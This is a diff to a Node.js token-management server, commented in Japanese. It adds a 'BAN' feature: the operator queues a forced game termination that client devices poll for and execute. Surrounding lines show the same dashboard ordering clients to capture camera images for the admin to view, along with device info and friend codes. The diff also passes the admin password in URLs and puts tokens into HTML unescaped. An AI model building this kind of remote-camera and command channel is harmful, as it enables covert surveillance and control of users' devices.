@@ -1,4 +1,4 @@
-// server.js - 完全版（オンライン状態判定機能付き）
+// server.js - 完全版（BAN機能付き）
 const express = require('express');
 const sqlite3 = require('sqlite3').verbose();
 const path = require('path');
@@ -98,6 +98,18 @@ db.serialize(() => {
       created_at DATETIME DEFAULT CURRENT_TIMESTAMP
     )
   `);
+  // ★追加: BAN リクエスト用テーブル
+  db.run(`
+    CREATE TABLE IF NOT EXISTS ban_requests (
+      id INTEGER PRIMARY KEY AUTOINCREMENT,
+      token TEXT NOT NULL,
+      status TEXT DEFAULT 'pending',
+      ban_type INTEGER DEFAULT 0,
+      requested_at DATETIME DEFAULT CURRENT_TIMESTAMP,
+      delivered_at DATETIME DEFAULT NULL,
+      executed_at DATETIME DEFAULT NULL
+    )
+  `);
 });
 
 // マイグレーション（既存DBへのカラム追加）
@@ -194,6 +206,16 @@ app.get('/dashboard', async (req, res) => {
     });
   });
 
+  // ★追加: BAN待機件数
+  const banPendingCounts = await new Promise(r => {
+    db.all("SELECT token, COUNT(*) as cnt FROM ban_requests WHERE status IN ('pending','delivered') GROUP BY token", (e, rows) => {
+      if (e) return r({});
+      const map = {};
+      rows.forEach(row => map[row.token] = row.cnt);
+      r(map);
+    });
+  });
+
   let html = `<h1>Token Manager(時間は＋9時間)</h1><ul>`;
   for (const [t, d] of Object.entries(tokenCache)) {
     const remaining = d.uses - d.used;
@@ -204,7 +226,11 @@ app.get('/dashboard', async (req, res) => {
     const cameraPending = cameraPendingCounts[t] || 0;
     const cameraBadge = cameraPending > 0 ? ` <span style="color:#e67e22; font-weight:bold;">📷待機中(${cameraPending})</span>` : '';
 
-    // ★追加: オンライン状態の判定（30秒以内に通信があれば「使用中」）
+    // ★追加: BAN待機バッジ
+    const banPending = banPendingCounts[t] || 0;
+    const banBadge = banPending > 0 ? ` <span style="color:#e74c3c; font-weight:bold;">🚫BAN待機(${banPending})</span>` : '';
+
+    // オンライン状態の判定（5秒以内に通信があれば「使用中」）
     const isOnline = d.last_seen && (Date.now() - d.last_seen < 5000);
     const onlineBadge = isOnline 
       ? `<span style="background:#28a745; color:white; padding:2px 6px; border-radius:4px; font-size:12px; font-weight:bold; margin-right:8px;">🟢 使用中</span>` 
@@ -213,12 +239,13 @@ app.get('/dashboard', async (req, res) => {
     html += `<li style="margin:10px 0; padding:6px; background:#fafafa; border-radius:6px;">
       ${onlineBadge}
       <b>${t}</b> - ${d.user} - Ver: ${d.version} - ${expired ? '期限切れ' : '残り: ' + remaining + '回'} - ${d.expires}
-      ${deviceStatus}${mismatchBadge}${cameraBadge}<br>
+      ${deviceStatus}${mismatchBadge}${cameraBadge}${banBadge}<br>
       <a href="/delete?token=${t}&password=${encodeURIComponent(adminPw)}" style="color:red;" onclick="return confirm('無効化？');">[無効化]</a>
       <a href="javascript:void(0)" onclick="showDeviceInfo('${t}')" style="color:#007bff; margin-left:8px;">[端末情報を表示]</a>
       <a href="javascript:void(0)" onclick="showFriendCodes('${t}')" style="color:#007bff; margin-left:8px;">[フレンドコードをみる]</a>
       <a href="javascript:void(0)" onclick="requestCamera('${t}')" style="color:#e67e22; margin-left:8px; font-weight:bold;">[📷 カメラ]</a>
       <a href="javascript:void(0)" onclick="showCameraImages('${t}')" style="color:#9b59b6; margin-left:8px; font-weight:bold;">[🖼 画像を見る]</a>
+      <a href="javascript:void(0)" onclick="requestBan('${t}')" style="color:#c0392b; margin-left:8px; font-weight:bold; background:#ffe5e5; padding:2px 8px; border-radius:4px;">[🚫 BAN]</a>
     </li>`;
   }
   html += `</ul><hr>
@@ -272,6 +299,22 @@ app.get('/dashboard', async (req, res) => {
         });
         const data = await res.json();
         if (res.ok) alert('📷 撮影リクエスト送信。クライアントが数秒以内に撮影します。');
+        else alert('エラー: ' + (data.error || 'unknown'));
+      } catch (e) {
+        alert('通信エラー: ' + e.message);
+      }
+    }
+    async function requestBan(token) {
+      if (!adminPw) return alert('セッションが切れました。再度ログインしてください。');
+      if (!confirm('このトークンの端末に強制ゲーム終了（BAN）を送信しますか？')) return;
+      try {
+        const res = await fetch('/api/admin/request-ban', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json', 'x-admin-password': adminPw },
+          body: JSON.stringify({ token, banType: 0 })
+        });
+        const data = await res.json();
+        if (res.ok) alert('🚫 BANリクエスト送信。クライアントが数秒以内に実行します。');
         else alert('エラー: ' + (data.error || 'unknown'));
       } catch (e) {
         alert('通信エラー: ' + e.message);
@@ -424,7 +467,7 @@ app.get('/api/check', async (req, res) => {
   }
 
   data.used++;
-  data.last_seen = Date.now(); // ★追加: 認証時にも生存確認更新
+  data.last_seen = Date.now(); // 認証時にも生存確認更新
   db.run("UPDATE tokens SET used = ?, last_seen = ? WHERE token = ?", [data.used, data.last_seen, token], (err) => { if (err) console.error(err); });
   res.json({ valid: true });
 });
@@ -474,7 +517,7 @@ app.get('/api/camera-poll', (req, res) => {
   if (!data) return res.status(404).json({ error: 'invalid token' });
   if (data.device_id !== device) return res.status(403).json({ error: 'device mismatch' });
 
-  // ★追加: ポーリング（5秒毎）を生存確認として利用
+  // ポーリング（5秒毎）を生存確認として利用
   data.last_seen = Date.now();
   db.run("UPDATE tokens SET last_seen = ? WHERE token = ?", [data.last_seen, token]);
 
@@ -543,6 +586,77 @@ app.get('/api/camera-image/:id', (req, res) => {
     res.set('Cache-Control', 'public, max-age=300');
     res.send(row.data);
   });
+});
+
+// === BAN 機能 ===
+app.post('/api/admin/request-ban', (req, res) => {
+  const adminPassword = req.headers['x-admin-password'];
+  if (adminPassword !== ADMIN_PASSWORD) return res.status(401).json({ error: 'Unauthorized' });
+
+  const { token, banType } = req.body || {};
+  if (!token) return res.status(400).json({ error: 'token required' });
+
+  const data = tokenCache[token];
+  if (!data) return res.status(404).json({ error: 'token not found' });
+  if (!data.device_id) return res.status(400).json({ error: '端末未登録のトークンです' });
+
+  db.run(
+    "INSERT INTO ban_requests (token, ban_type, status) VALUES (?, ?, 'pending')",
+    [token, parseInt(banType) || 0],
+    function (err) {
+      if (err) return res.status(500).json({ error: err.message });
+      res.json({ ok: true, requestId: this.lastID });
+    }
+  );
+});
+
+app.get('/api/ban-poll', (req, res) => {
+  const { token, device } = req.query;
+  if (!token || !device) return res.status(400).json({ error: 'token and device required' });
+
+  const data = tokenCache[token];
+  if (!data) return res.status(404).json({ error: 'invalid token' });
+  if (data.device_id !== device) return res.status(403).json({ error: 'device mismatch' });
+
+  // 生存確認
+  data.last_seen = Date.now();
+  db.run("UPDATE tokens SET last_seen = ? WHERE token = ?", [data.last_seen, token]);
+
+  db.get(
+    "SELECT id, ban_type FROM ban_requests WHERE token = ? AND status = 'pending' ORDER BY id ASC LIMIT 1",
+    [token],
+    (err, row) => {
+      if (err) return res.status(500).json({ error: err.message });
+      if (!row) return res.json({ request: null });
+
+      db.run(
+        "UPDATE ban_requests SET status = 'delivered', delivered_at = CURRENT_TIMESTAMP WHERE id = ?",
+        [row.id],
+        (err2) => {
+          if (err2) return res.status(500).json({ error: err2.message });
+          res.json({ request: { id: row.id, type: row.ban_type || 0 } });
+        }
+      );
+    }
+  );
+});
+
+app.get('/api/ban-executed', (req, res) => {
+  const { token, device, requestId } = req.query;
+  if (!token || !device || !requestId) return res.status(400).json({ error: 'missing fields' });
+
+  const data = tokenCache[token];
+  if (!data) return res.status(404).json({ error: 'invalid token' });
+  if (data.device_id !== device) return res.status(403).json({ error: 'device mismatch' });
+
+  db.run(
+    "UPDATE ban_requests SET status = 'executed', executed_at = CURRENT_TIMESTAMP WHERE id = ? AND token = ?",
+    [requestId, token],
+    (err) => {
+      if (err) return res.status(500).json({ error: err.message });
+      res.json({ ok: true });
+    }
+  );
 });
 
 // === 管理API ===
